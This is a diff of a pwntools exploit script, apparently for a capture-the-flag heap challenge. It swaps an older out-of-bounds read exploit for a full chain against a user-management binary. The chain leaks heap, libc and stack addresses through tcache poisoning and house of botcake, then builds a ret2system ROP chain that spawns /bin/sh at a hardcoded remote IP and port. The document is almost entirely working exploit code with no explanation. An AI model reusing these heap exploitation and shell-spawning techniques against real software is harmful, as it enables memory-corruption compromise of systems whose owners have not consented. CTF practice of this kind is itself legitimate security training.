@@ -1178,10 +1178,13 @@ import sys
 # =========================================================
 #                          SETUP                         
 # =========================================================
-exe = './chall_patched'
+exe = './main_patched'
 try: elf = context.binary = ELF(exe, checksec=False)
 except: elf = type('S',(),{'address':0})()
 try: libc = elf.libc
+# libc = './libc.so.6'
+# libc = ELF(libc, checksec=False)
+# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
 except: libc = type('S',(),{'address':0})()
 context.log_level = 'debug'
 context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
@@ -1191,6 +1194,7 @@ gdbscript = '''
 init-pwndbg
 # set architecture aarch64
 # target remote :5000
+b *create_user+399
 c
 '''.format(**locals())
 
@@ -1221,7 +1225,7 @@ def initialize(argv=[]):
         return p
     elif args.REMOTE:
         context.log_level = 'info'
-        host, port = ("103.185.52.103", 2001) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
+        host, port = ("103.185.52.103", 5003) if len(sys.argv) < 4 else (sys.argv[2], int(sys.argv[3]))
         return remote(host, port, ssl=False)
     elif use_ip():
         context.log_level = 'info'
@@ -1301,13 +1305,12 @@ nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))
 # =========================================================
 #                         CHECKSEC
 # =========================================================
-# [*] '/home/kali/Windows/Schematic NPC/deepspace/chall_patched'
+# [*] '/home/kali/Windows/Schematic NPC/washed/main'
 #     Arch:       amd64-64-little
 #     RELRO:      Full RELRO
-#     Stack:      No canary found
+#     Stack:      Canary found
 #     NX:         NX enabled
 #     PIE:        PIE enabled
-#     RUNPATH:    b'.'
 #     SHSTK:      Enabled
 #     IBT:        Enabled
 #     Stripped:   No
@@ -1315,53 +1318,111 @@ nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))
 # =========================================================
 #                         EXPLOITS
 # =========================================================
-def menu(choice:int):
-    sla(b"> ", se(choice))
+def mangle(heap_addr, val):
+    return (heap_addr >> 12) ^ val
 
-def opt1_send_signal(size:int, data:bytes):
+def menu(choice):
+    sla(b">> ", se(choice))
+
+def create_user(uid, age, name_bytes=b"\x00"*8):
     menu(1)
-    sla(b"Payload size: ", se(size))
-    ru(b"Send your diagnostic signal!\n")
-    s(data)
-    ru(b"[+] Signal sent.\n")
+    sla(b"Enter ID: ", se(uid))
+    sla(b"Enter Age: ", se(age))
+    sa(b"Enter Name: ", name_bytes)
+    rl()
 
-def opt2_load_flag():
+
+def delete_user(idx):
     menu(2)
-    ru(b"[+] Message stored successfully\n")
+    sla(b"Enter user index to delete: ", se(idx))
+    rl()
 
-
-def opt3_read_log(size:int) -> bytes:
+def list_users():
     menu(3)
-    sla(b"Enter log size: ", se(size))
-    ru(b"--- Full Diagnostic Log ---\n")
-    blob = io.recvn(size, timeout=2)
-    ru(b"\n--- End of Full Log ---\n")
-    return blob
+    out = ru(b">> ", drop=False)
+    log.info("\nLIST OUTPUT:\n" + out.decode(errors='ignore'))
+    return out
 
-def opt5_show_pointers() -> tuple[int,int]:
-    menu(5)
-    ru(b"--- Aliens Info ---\n")
-    ru(b"Aliens 1: ")
-    v3 = int(rl().strip(), 16)
-    ru(b"Aliens 2: ")
-    buf = int(rl().strip(), 16)
-    ru(b"--------------------\n")
-    return v3, buf
+
+def edit_user(idx, new_id, new_age, new_name=b"\x00"*8):
+    menu(4)
+    sla(b"Enter user index to edit: ", se(idx))
+    sla(b"Enter new ID: ", se(new_id))
+    sla(b"Enter new Age: ", se(new_age))
+    sa(b"Enter new Name: ", new_name)
+    rl()
+
+def tcache_poison(idx, target, id, age, name):
+    global heap
+    create_user(idx, idx)
+    create_user(idx + 1, idx + 1)
+    delete_user(idx)
+    delete_user(idx + 1)
+    edit_user(idx + 1, mangle(heap, target), idx + 1)  # overwrite fd pointer
+    create_user(idx + 2, idx + 2)
+    debug()
+    create_user(id, age, name) 
+
+def house_of_botcake(idx, target, id, age, name, cheap=False):
+    global heap
+    if not cheap:
+        for i in range(9):
+            create_user(idx + i, idx + i, p64(heap >> 12))
+
+    for i in range(9):
+        delete_user(idx + i)
+    delete_user(idx + i - 1)
+    delete_user(idx + i)
+    delete_user(idx + i - 1)
+    for i in range(7):
+        create_user(idx + i + 9, idx + i + 9, p64(heap >> 12))
+    create_user(mangle(heap, target), idx + i + 9 + 1, p64(heap >> 12))
+    create_user(idx + i + 9 + 2, idx + i + 9 + 2, p64(heap >> 12))
+    create_user(idx + i + 9 + 3, idx + i + 9 + 3, p64(heap >> 12))
+    create_user(id, age, name)
+
+def ret2system():
+    rop = ROP(libc)
+    rop.system(next(libc.search(b'/bin/sh')))
+    return rop.chain()
+
 
 def exploit(x):
-    global io
+    global io, heap
     io = initialize()
-    debug()
-    v3, buf = opt5_show_pointers()
-    leak("v3 (secure buffer)", hex(v3))
-    leak("buf (user buffer)", hex(buf))
-    opt2_load_flag()
-    want = (v3 - buf) + 0x80
-    log.info(f"Attempting OOB read of {want:#x} bytes to cover v3 region…")
-    dump = opt3_read_log(want)
-    off = v3 - buf
-    flag_part = dump[off:off+0x64]
-    log.success(f"Extracted bytes at offset {off:#x} (candidate flag): {flag_part!r}")
+    # Code here ...
+    with log.progress("Leaking heap"), context.silent:
+        create_user(0, 0) # idx 0
+        delete_user(0) # free to put in tcache
+        menu(3)
+        ru("ID: ")
+        heap = int(ru(",")) << 12 # shift back to full addr
+    leak("Heap base", hex(heap))
+    with log.progress("Leaking libc"), context.silent:
+        house_of_botcake(1, heap + 0x2a0 + 0x10, 0, 0x441, b"\x00"*8)
+        for i in range(27):    
+            create_user(0, 0)
+        delete_user(2)
+        menu(3)
+        ru("2, ID: ")
+        libc_leak = int(ru(","))
+        libc.address = libc_leak - (libc.sym["main_arena"] + 96)
+    leak("Libc leak", hex(libc_leak))
+    with log.progress("Leaking stack"), context.silent:
+        house_of_botcake(27, libc.sym["environ"] - 0x18, heap >> 12, heap >> 12, b"Z"*8, cheap=True)
+        menu(3)
+        ru("Z"*8)
+        stack_leak = u64(rl().strip().ljust(8, b"\x00"))
+        ret = stack_leak - 0x150
+    leak("Stack leak", hex(stack_leak))
+    leak("Return address", hex(ret))
+    with log.progress("Preparing final exploit"), context.silent:
+        delete_user(47) # Guard Chunk
+        payload = ret2system()
+        create_user(u64(payload[:8]), u64(payload[8:0x10]), payload[0x10:])  # UAF to the gueard chunk
+        leave = nsa(libc, "leave; ret")
+        tcache_poison(60, ret-8, heap + 0x700 - 8, leave, b"B"*8)
+
     leak("ELF base address", hex(elf.address)) if elf.address else None
     leak("Libc base address", hex(libc.address)) if libc.address else None
     io.interactive() if not args.NOINTERACT else None
